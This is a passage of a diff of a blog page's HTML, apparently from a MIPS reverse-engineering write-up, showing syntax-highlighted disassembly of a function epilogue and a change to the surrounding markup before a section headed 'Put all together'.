 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">AC</span>                 <span class="no">ld</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B0</span>                 <span class="no">ld</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B4</span>                 <span class="no">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="mi">0x90</span>        <span class="c"># Doubleword Add Immediate Unsigned
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">B8</span>                 <span class="no">jr</span>      <span class="no">$ra</span>              <span class="c"># Jump Register
-</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">BC</span>                 <span class="no">nop</span></code></pre></td></tr></table>
-</div>
-</div>
-<div class="gblog-post__anchorwrap">
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">BC</span>                 <span class="no">nop</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
     <h2 id="put-all-together">
         Put all together
         <a data-clipboard-text="https://nasm.re/posts/mipsy/#put-all-together" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Put all together" href="#put-all-together">
